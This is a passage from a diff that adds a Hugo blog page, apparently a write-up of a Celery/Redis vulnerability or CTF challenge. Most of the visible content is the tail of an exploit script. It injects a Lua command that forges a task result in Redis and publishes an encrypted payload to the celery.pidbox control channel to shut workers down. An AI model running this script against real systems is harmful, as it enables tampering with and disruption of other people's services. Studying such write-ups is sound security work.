style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;&#39; .. escaped_value .. &#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;}, </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;traceback</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;: null, </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;children</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;: [], </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;date_done</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;: </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;2025-10-31T03:20:37.823922</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;, </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;task_id</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;: </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;}&#39; redis.call(&#39;SET&#39;, KEYS[2], json_result) return json_result&#34; 2 celery celery-task-meta-</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span><span style="color:#f92672">.</span>strip() <span style="color:#f92672">%</span> (task_id, task_id)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    wapper(data, <span style="color:#e6db74">&#39;get key&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">shutdown</span>(task_id : str):
+</span></span><span style="display:flex;"><span>    enc_data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">lS454QZOgIjdsGxC4RpQ6ee3medGLzUJ6+nmFB7kphyoGDi4bsnJc6OgJoe4BhzKSp+LzoRnd+b1RF8e95Pv3N9VlTbFkNmhFsKghRTa0Kp1SLMKX5VKShbGlSjenq1V+oRohMaaSLSbImQA4oLbOYP2XZ2bKN0uHsuDjZ7z3TV2wEslyjq0GZCnYakWErVMx3qlwWN83PT9P0cCmh1LLOuI6LUPBOnCm58ajvfzBDZY7MwElGOcLsZy1hKo2sfEp5dU90grFLubyLRX4Ivw6Z61UZknm5LGQyLmx+VLyRkBrwSmUSHpNQ==
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    PUBLISH /0.celery.pidbox &#39;{&#34;body&#34;: &#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;, &#34;content-encoding&#34;: &#34;binary&#34;, &#34;content-type&#34;: &#34;application/x-miniws&#34;, &#34;headers&#34;: {&#34;clock&#34;: 1, &#34;expires&#34;: 1861891032.9756505}, &#34;properties&#34;: {&#34;delivery_mode&#34;: 2, &#34;delivery_info&#34;: {&#34;exchange&#34;: &#34;celery.pidbox&#34;, &#34;routing_key&#34;: &#34;&#34;}, &#34;priority&#34;: 0, &#34;body_encoding&#34;: &#34;base64&#34;, &#34;delivery_tag&#34;: &#34;e9cb2a03-3968-4a48-a3ea-ca7ba413c012&#34;}}&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span><span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    wapper(data, <span style="color:#e6db74">&#39;shutdown&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>task_id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;d3ae97dd-8ed9-4b72-ad47-4c785f2302f0&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>write_file(task_id)
+</span></span><span style="display:flex;"><span>get_key(task_id)
+</span></span><span style="display:flex;"><span>shutdown(task_id)
+</span></span></code></pre></div><h1 id="参考">参考<a hidden class="anchor" aria-hidden="true" href="#参考">#</a></h1>
+<p><a href="https://snyk.io/blog/python-rce-vulnerability/">https://snyk.io/blog/python-rce-vulnerability/</a></p>
+<p><a href="http://gensokyo.cn/2025/10/19/celerace/">http://gensokyo.cn/2025/10/19/celerace/</a></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://zoiltin.github.io/">zoiltin&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
